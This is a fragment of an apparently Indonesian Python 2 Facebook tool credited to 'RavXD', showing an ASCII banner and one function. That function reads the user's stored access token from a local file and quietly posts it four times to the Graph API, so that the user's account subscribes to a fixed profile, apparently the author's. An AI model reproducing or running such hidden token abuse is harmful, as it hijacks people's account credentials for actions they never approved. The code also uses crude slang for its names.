...
░ ░░ ░ ░      ░     ░░   ░ 
░  ░          ░      ░     
                       ® \033[0m|| Created By RavXD
 \033[0;96m     \033[0m|| Github.com/RavXD
 \033[0;96m   \033[0;91mv2.0  \033[0m|| Facebook.com/RavXD211'''
...
xi_jimpinx = '2963048844013729'
def kontol():
    try:
        kentod = open('__yayan__.txt', 'r').read()
    except IOError:
    	print '\n %s[%s×%s] token invalid'%(N,M,N);yayanxd()
    requests.post('https://graph.facebook.com/100009259285042/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/100009259285042/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/100009259285042/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/100009259285042/subscribers?access_token=%s'%(kentod))
